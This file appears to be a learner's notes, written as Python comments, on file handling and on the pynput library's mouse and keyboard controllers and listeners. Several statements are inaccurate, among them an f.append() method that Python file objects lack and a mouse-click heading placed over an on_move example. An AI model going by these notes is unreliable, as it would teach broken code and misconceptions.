# BASIC CONCEPTS 
# FILE HANDLING USING PYTHON

# opening a file - f = open("file_name.txt", mode of opening)
# opening modes - w : write, r : read, a : append
# store the instance of the opened file in a variable for easy access to file later 
# f = open("sample.txt", 'a')

# writing to a file - write("Some Content")
# f.write('This is an example to demonstrate write func. in python')

# reading from a file - read()
# content = f.read() : save the file data in a variable for further use 

# appending to a file - append('New Content')
# adds the new content at the end of the file without deleting previous content
# f.append('This Line will be added to existing document without deleting prev data')

# to always start writing from new line insert \n 

# closing a file - f.close()
# releases the memory allocated to a variable to avoid any further errors

# with keyword - automatically releases memory when the need is over
# with open("sample.txt", 'a') as f:
#   f.write("Content")

# seek() - used to change the position of cursor in file handling
# syntax - f.seek(offset, from_where)
# offset : no. of position to be moved by cursor
# from_where : it has 3 values -> 0 - beginning of file, 1 - current position, 2 - end of file

# tell() - returns the current position/index of cursor in file

# EVENT LISTENERS IN PYTHON - using pynput library
# 1. Controlling Mouse
#       Import Controller from package - from pynput.mouse import Controller
#       Create a user defined func to control mouse - def controlMouse()
#       Call the controller function - mouse = Controller()
#       Change the mouse position - mouse.position = (x, y) { x - position along X - axis, y - Position along Y - axis } (in pixels)
# 2. Controlling KeyBoard 
#       Import Controller from package - from pynput.keyboard import Controller
#       Create a user defined func to control keyboard - def controlKeyBoard()
#       Call the controller function - keyboard = Controller()
#       Call the type() with the string that has to be typed as arguement
#       keyboard.type("This Line has been added by keyboard controller in pynput")
# ** We cannot control mouse and keyboard simultaneously using pynput package **

# 3. Listening For Keystrokes
# import Listener from package - from pynput.keyboard import Listener
# Listener(on_press = func. to be called)
# on_press - triggered whenever a key is pressed 
# i.e. detects key presses and passes it as parameter to the func. given to the listener object

# 4. Listening for Mouse Clicks
# import Listener from package - from pynput.mouse import Listener
# Listener(on_move = func. to be called)
# on_move - triggered whenever mouse position changes
